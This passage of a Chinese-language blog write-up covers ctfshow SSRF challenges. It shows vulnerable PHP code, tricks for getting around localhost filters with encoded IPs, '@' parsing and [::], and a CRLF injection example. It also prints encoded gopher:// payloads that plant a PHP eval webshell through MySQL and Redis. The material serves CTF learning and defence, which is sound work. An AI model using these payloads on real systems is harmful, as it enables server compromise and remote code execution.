+	<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token comment">// 进行了过滤，过滤掉了localhost和127.0.0.*</span>
+        	<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">//启用时会将头文件的信息作为数据流输出</span>
+			<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p style="color:blue;">url=http://0x7F.0.0.1/flag.php   16进制</p>
+<p style="color:blue;">url=http://0177.0.0.1/flag.php    8进制</p>
+<p style="color:blue;">url=http://0.0.0.0/flag.php</p>
+<p style="color:blue;">url=http://0/flag.php</p>
+<p style="color:blue;">url=http://127.127.127.127/flag.php</p>
+</blockquote>
+<h5 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\。/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token comment">// 这里过滤了。数字127等，我们不能利用句号或者短网址进行绕过</span>
+            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>十六进制 url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>八进制 url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>10 进制整数格式 url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>16 进制整数格式 url=<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a><br>短网址方式：127.0.0.1也可以写成127.1<br>用CIDR绕过localhost<br>url=<a target="_blank" rel="noopener" href="http://127.127.127.127/flag.php">http://127.127.127.127/flag.php</a><br>url=<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url=<a target="_blank" rel="noopener" href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
+</blockquote>
+<h5 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$host</span><span class="token operator">=</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+		<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="5-2-限制为http-www-xxx-com-域名时（利用-）"><a href="#5-2-限制为http-www-xxx-com-域名时（利用-）" class="headerlink" title="5.2 限制为http://www.xxx.com 域名时（利用@）"></a>5.2 限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</h4><p>可以尝试采用http基本身份认证的方式绕过如：<a target="_blank" rel="noopener" href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异./">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异。</a><br>在PHP的parse_url中会识别<a target="_blank" rel="noopener" href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
+<h5 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^http:\/\/ctf\..*show$/i'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里的正则表示以<code>http://ctf.</code>开头，以<code>show</code>结尾，即匹配<code>http://ctf.*show</code> ，我们可以用@方式进行绕过，如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，如果不在<code>show</code>前面加<code>#</code>或<code>?</code>，会把<strong>show</strong>也解析到<strong>path</strong>中，得不到想要的结果</p>
+<h4 id="5-3-SSRF利用-Gopher-协议拓展攻击面"><a href="#5-3-SSRF利用-Gopher-协议拓展攻击面" class="headerlink" title="5.3 SSRF利用 Gopher 协议拓展攻击面"></a>5.3 SSRF利用 Gopher 协议拓展攻击面</h4><h5 id="Web359"><a href="#Web359" class="headerlink" title="Web359"></a>Web359</h5><img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Web359登录界面.png" alt="1666666568052" style="zoom:25%;" />
+
+<p>随便输一个用户名，进入后台<del>靶场并没有做</del>，使用hackbar工具打开，我们可以看到在登录时前后端传参的方法</p>
+<pre class="line-numbers language-none"><code class="language-none">returl&#x3D;https%3A%2F%2F404.chall.ctf.show%2F&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>SSRF漏洞出现在returl参数上， 利用gopher协议去打无密码的mysql 。</p>
+<p>这里要用到工具Gopherus来生成payload进行rce ，我们可以做一个一句话木马写进去</p>
+<blockquote>
+<p>工具下载地址: <a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">Gopherus</a> </p>
+</blockquote>
+<blockquote>
+<p>select ‘<?php eval($_POST[1]); ?>‘ into outfile ‘/var/www/html/1.php</p>
+</blockquote>
+<img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面.png" style="zoom: 67%;" />
+
+<blockquote>
+<p>这里得到的参数必须在进行一次URL编码才能进行利用。</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">returl&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2572%256f%256f%2574%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2545%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%253c%253f%2570%2568%2570%2520%2565%2576%2561%256c%2528%2524%255f%2550%254f%2553%2554%255b%2531%255d%2529%253b%2520%253f%253e%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2527%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%252f%2531%252e%2570%2568%2570%2501%2500%2500%2500%2501&amp;u&#x3D;Username<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个是check.php 不过没找到什么可以用的东西….</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'returl'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/file|dict/i"</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">_request</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$url</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">function</span> <span class="token function-definition function">_request</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span><span class="token variable">$https</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token variable">$method</span><span class="token operator">=</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//初始化</span>
+		<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$curl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置不需要头信息</span>
+		<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取页面内容，但不输出</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$https</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYPEER</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做服务器认</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_SSL_VERIFYHOST</span><span class="token punctuation">,</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//不做客户端认证</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token operator">==</span><span class="token string single-quoted-string">'post'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置请求是post方式</span>
+            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POSTFIELDS</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//设置post请求数据</span>
+        <span class="token punctuation">&#125;</span>
+		<span class="token variable">$str</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行访问</span>
+		<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭curl，释放资源</span>
+		<span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>ctfshow{2abfc1df-79f7-49a9-b02a-d5d5908d150e}</p>
+</blockquote>
+<h5 id="Web360"><a href="#Web360" class="headerlink" title="Web360"></a>Web360</h5><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>ssrf打redis，基本上四种攻击方式：</p>
+<ul>
+<li>写webshell</li>
+<li>写ssh公钥</li>
+<li>写contrab计划任务反弹shell</li>
+<li>主从复制</li>
+</ul>
+<p>当然这个题目肯定是shell，这次的flag并不在本地的flag文件中。题目提示我们打redis，同样用Gopherus工具来生成我们的payload。同样写一句话木马进去。</p>
+<img src="https://im-so-scared-2.gitee.io/shier_jinghuang/2022/10/25/SSRF漏洞原理攻击与防御/Gopherus操作页面2.png" style="zoom: 80%;" />
+
+<blockquote>
+<p>gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2429%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</p>
+</blockquote>
+<h4 id="5-4-其他绕过方式："><a href="#5-4-其他绕过方式：" class="headerlink" title="5.4 其他绕过方式："></a>5.4 其他绕过方式：</h4><p><strong>利用特殊域名利用[::]</strong></p>
+<p><strong>可以利用[::]来绕过localhost</strong></p>
+<blockquote>
+<p style="color:orange;">http://169.254.169.254>>http://[::169.254.169.254] </p>
+</blockquote>
+<blockquote>
+<p style="color:orange;">利用句号: 127。0。0。1 >>> 127.0.0.1</p>
+</blockquote>
+<p><strong>CRLF 编码绕过</strong></p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车        %0a-&gt;0x0a-&gt;\n换行        进行HTTP头部注入</p>
+<p style="color:orange;">example.com/?url=http://eval.com%0d%0aHOST:fuzz.com%0d%0a </p>
+</blockquote>
+<p><strong>封闭的字母数字</strong></p>
+<h3 id="六、常见限制及对应方式："><a href="#六、常见限制及对应方式：" class="headerlink" title="六、常见限制及对应方式："></a>六、常见限制及对应方式：</h3><p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<blockquote>
+<p style="color:orange;">采用http基本身份认证的方式绕过，即@http://www.xxx.com@www.xxc.com</p>
+</blockquote>
+<p>2.限制请求IP不为内网地址</p>
+<blockquote>
+<p style="color:orange;">当不允许ip为内网地址时：采取短网址绕过、采取特殊域名、采取进制转换</p>
+</blockquote>
+<p>3.限制请求只为http协议</p>
+<blockquote>
+<p style="color:orange;">采取302跳转、采取短地址</p>
+</blockquote>
+<h3 id="七、免责声明"><a href="#七、免责声明" class="headerlink" title="七、免责声明"></a>七、免责声明</h3><blockquote>
+<p style="color:red;">本课程及所讲述的所有技术仅能在取得足够合法授权的企业安全建设中使用，在使用学习本课程的过程中，您应确保自己所有行为符合当地的法律法规。 如您在学习本课程后中存在任何非法行为，您将自行承担所有后果，本课程所有开发者和所有贡献者不承担任何法律及连带责任。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要阅读本课程。 您的阅读行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
+</blockquote>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">十二惊惶</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
